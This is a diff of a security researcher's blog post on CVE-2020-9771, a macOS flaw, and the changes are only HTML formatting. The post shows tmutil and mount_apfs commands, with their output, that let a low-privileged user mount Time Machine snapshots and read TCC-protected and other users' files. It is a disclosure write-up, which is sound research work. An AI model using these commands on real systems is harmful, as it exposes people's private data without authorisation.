@@ -19,8 +19,8 @@ This could be achieved with a single command, for example: mount_apfs -o noowner
 This could be achieved with a single command, for example: mount_apfs -o noowners -s http://com." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/posts/cve_2020_9771/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-07-03T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2020-07-03T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2020-07-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-03T00:00:00+00:00" />
 
 
 
@@ -56,7 +56,7 @@ This could be achieved with a single command, for example: mount_apfs -o noowner
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.84.1" />
+    <meta name="generator" content="Hugo 0.89.2" />
   </head>
 
   <body class=" ">
@@ -156,7 +156,7 @@ This could be achieved with a single command, for example: mount_apfs -o noowner
 </ol>
 <h2 id="1-privacy-bypass">1. Privacy bypass</h2>
 <p>From Terminal we can get a list of local snapshots available:</p>
-<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
+<pre tabindex="0"><code>% tmutil listlocalsnapshots /System/Volumes/Data
 Snapshots for volume group containing disk /System/Volumes/Data:
 com.apple.TimeMachine.2019-11-15-202744.local
 com.apple.TimeMachine.2019-11-16-135116.local
@@ -167,9 +167,9 @@ com.apple.TimeMachine.2019-11-16-214156.local
 com.apple.TimeMachine.2019-11-17-112126.local
 com.apple.TimeMachine.2019-11-17-122313.local
 </code></pre><p>We can mount one:</p>
-<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
+<pre tabindex="0"><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
 </code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
-<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
+<pre tabindex="0"><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
 total 6224
 drwx———@ 12 csaby  staff      384 Nov  6 13:56 Archive
 drwx———  22 csaby  staff      704 Nov 13 20:22 Attachments
@@ -181,24 +181,24 @@ drwx———   4 csaby  staff      128 Nov  7 20:30 StickerCache
 -rw-r———r———   1 csaby  staff    32768 Nov 16 08:09 prewarm.db-shm
 -rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
 </code></pre><p>if we compare it with standard access, it is not permitted:</p>
-<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
+<pre tabindex="0"><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
 ls: Messages: Operation not permitted
 </code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
 <p>We can also force the creation of a snapshot if there is no one:</p>
-<pre><code>csaby@mac ~ % tmutil localsnapshot
+<pre tabindex="0"><code>csaby@mac ~ % tmutil localsnapshot
 Created local snapshot with date: 2019-11-17-140728
 </code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
 <h2 id="2--privilege-escalation">2.  &ldquo;Privilege escalation&rdquo;</h2>
 <p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
 <p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can&rsquo;t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
 <p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
-<pre><code>% id                       
+<pre tabindex="0"><code>% id                       
 uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
 </code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
-<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
+<pre tabindex="0"><code>n00b@mac Messages % ls -l /Users/csaby/Library 
 ls: Library: Permission denied
 </code></pre><p>Let’s create and list local snapshots:</p>
-<pre><code>n00b@mac Messages % tmutil localsnapshot
+<pre tabindex="0"><code>n00b@mac Messages % tmutil localsnapshot
 Created local snapshot with date: 2019-11-17-141812
 
 % tmutil listlocalsnapshots /
@@ -210,10 +210,10 @@ com.apple.TimeMachine.2019-11-17-141812.local
 <blockquote>
 <p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
 </blockquote>
-<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
+<pre tabindex="0"><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
 mount_apfs: snapshot implicitly mounted readonly
 </code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
-<pre><code>% cd /tmp/snap/Users/csaby 
+<pre tabindex="0"><code>% cd /tmp/snap/Users/csaby 
 n00b@mac csaby % ls -l Library/Messages 
 total 4704
 -rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
@@ -232,7 +232,7 @@ total 4704
 <blockquote>
 <p>Thank you for providing additional information. We will investigate.</p>
 </blockquote>
-<p>After this point we went into, what I call &ldquo;black hole mode&rdquo;, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn&rsquo;t know if they considered this fixed or not, as no one came back to me. Their description &ldquo;This issue was addressed with a new entitlement.&rdquo; is extremely misleading.</p>
+<p>After this point we went into, what I call &ldquo;black hole mode&rdquo;, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170)">https://support.apple.com/en-us/HT211170)</a>, and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn&rsquo;t know if they considered this fixed or not, as no one came back to me. Their description &ldquo;This issue was addressed with a new entitlement.&rdquo; is extremely misleading.</p>
 <p>I sent an email again on May 27th (still in &ldquo;black hole mode&rdquo;):</p>
 <blockquote>
 <p>I want to ask again if you consider this fixed via controlling this &ldquo;exploit&rdquo; via the &ldquo;Full Disk Access&rdquo; permission in TCC. As noted earlier I think it&rsquo;s not right.</p>
